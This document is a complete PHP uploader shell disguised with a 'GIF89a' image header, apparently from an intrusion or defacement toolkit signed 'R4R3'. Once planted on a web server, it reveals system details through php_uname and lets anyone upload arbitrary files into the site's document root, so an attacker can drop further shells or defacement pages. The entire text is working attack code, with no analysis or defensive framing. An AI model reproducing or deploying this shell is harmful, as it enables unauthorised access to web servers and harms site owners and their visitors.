GIF89a;
<?php
echo "Home Root Uploader ~ R4R3<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='rare'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['rare']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['rare']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "uploaded ~> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal euy";
		}
	} else {
		if(@copy($_FILES['rare']['tmp_name'], $files)) {
			echo "sukses <b>$files</b> in this folder";
		} else {
			echo "gagal euy";
		}
	}
}
?>
